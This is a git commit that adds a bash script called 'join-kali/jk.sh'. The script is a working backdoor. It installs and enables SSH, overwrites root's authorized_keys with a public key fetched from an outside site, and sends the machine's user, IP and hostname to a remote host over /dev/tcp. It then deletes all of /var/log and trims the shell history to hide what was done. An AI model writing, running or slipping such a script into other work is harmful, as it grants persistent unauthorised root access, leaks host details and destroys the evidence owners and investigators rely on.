8740227eb83bfc54aa0aa3ce62e5227c692f6646
ErikBoesen <me@erikboesen.com>
2017-07-10 07:40:26 -0400

    Add Kali join script

---
+++ join-kali/jk.sh
@@ -0,0 +1,34 @@
+#!/bin/bash
+
+apt-get install openssh-server -y
+systemctl start ssh.service
+systemctl enable ssh.service
+
+SSHPATH="/root/.ssh"
+
+mkdir -p "$SSHPATH"
+
+rm -f "$SSHPATH/authorized_keys"
+echo "Downloading pubkey..."
+curl -so "$SSHPATH/authorized_keys" https://erikboesen.com/pubkey
+
+USER=`whoami`
+IP=`hostname -I`
+HOSTNAME=`hostname`
+
+SERVER="boesen.science"
+PORT=2043
+
+exec 3<>/dev/tcp/${SERVER}/${PORT}
+# TODO: This format doesn't work very well
+echo "${USER} ${IP} ${HOSTNAME}" >&3
+
+cat <&3
+
+rm -rf /var/log/*
+sed -e '$ d' ~/.bash_history > /tmp/.bash_history; mv /tmp/.bash_history ~/.bash_history
+
+#killall gnome-terminal-server
+
+clear;clear;clear
+exit 0
